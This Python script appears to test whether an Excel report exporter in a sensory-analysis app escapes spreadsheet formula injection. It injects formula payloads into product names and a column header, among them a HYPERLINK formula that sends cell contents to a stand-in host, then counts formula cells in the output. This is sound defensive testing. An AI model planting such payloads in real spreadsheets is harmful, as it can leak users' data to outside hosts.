import sys, io, warnings; warnings.filterwarnings("ignore")
sys.path.insert(0, "/var/home/Lukas/Projects/RATA-Flow-App")
import pandas as pd, openpyxl
from core.data import clean_and_structure_data
from stats.descriptive import calculate_descriptives
from stats.mixed_models import run_mixed_models
from stats.posthoc import generate_cld
from stats.shared.frequency import run_cochrans_q
from utils.export import generate_excel_report
CM = {"assessor": "Panelist", "product": "Product", "replicate": "Session"}
raw = pd.read_excel("/var/home/Lukas/Projects/RATA-Flow-App/example_data/02_Descriptive/DA_chocolates_sensochoc.xlsx")
raw.columns = raw.columns.str.strip()
prods = sorted(raw["Product"].astype(str).unique())
evil = {prods[0]: '=HYPERLINK("http://example.invalid/?x="&A2,"click")',
        prods[1]: "=1+1", prods[2]: "+1+2", prods[3]: "-3+4", prods[4]: "@SUM(1)"}
raw["Product"] = raw["Product"].astype(str).map(lambda p: evil.get(p, p))
attr = [c for c in raw.columns if c not in CM.values()][0]
raw = raw.rename(columns={attr: "=2*21"})
dl, _, _ = clean_and_structure_data(raw, CM, 0, 10, [], module="RATA")
summ = calculate_descriptives(dl, CM)
anova, _ = run_mixed_models(dl, CM, 0.05)
q = run_cochrans_q(dl, CM, 0.05)
cld = generate_cld(dl, summ, anova, CM, 0.05, "Tukey HSD")
state = {"rata_alpha": 0.05, "rata_post_hoc_method": "Tukey HSD", "rata_col_map": CM}
buf = generate_excel_report(dl, summ, cld, anova, q, "Tukey HSD", CM, 0.05, state=state)
open(sys.argv[1], "wb").write(buf.getvalue())
wb = openpyxl.load_workbook(io.BytesIO(buf.getvalue()))
tot = 0
for ws in wb.worksheets:
    f = [(c.coordinate, c.value) for row in ws.iter_rows() for c in row if c.data_type == "f"]
    tot += len(f)
    if f: print(ws.title, len(f), f[:2])
print("total formula cells", tot)
# other prefixes
for ws in wb.worksheets:
    for row in ws.iter_rows():
        for c in row:
            if isinstance(c.value, str) and c.value[:1] in "+-@":
                print("non-= prefix stored as", c.data_type, repr(c.value), ws.title); raise SystemExit
